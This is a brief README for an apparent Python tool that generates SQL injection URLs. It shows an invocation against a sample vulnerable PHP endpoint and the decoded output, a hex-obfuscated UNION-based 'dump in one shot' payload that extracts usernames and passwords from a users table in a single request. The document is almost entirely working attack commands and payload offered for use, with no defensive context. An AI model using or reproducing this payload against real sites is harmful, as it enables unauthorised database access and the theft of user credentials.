# README

Build SQLi URL Helper.

```zsh
❯ pipx run build-sqli-url 'http://site.com/vuln.php?id=-1' -s 15 -d 3 dios users username password
```

Result (decoded):

```sql
http://site.com/vuln.php?id=-1 union all select 1,2,(select(@a)from(select(@a:=0x00),(select(@a)from(users)where(table_schema<>0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,coalesce(username,0x00),0x09,coalesce(password,0x00),0x3c62723e))))a),4,5,6,7,8,9,10,11,12,13,14,15 -- -
```

```zsh
❯ pip install build_sqli_url
```
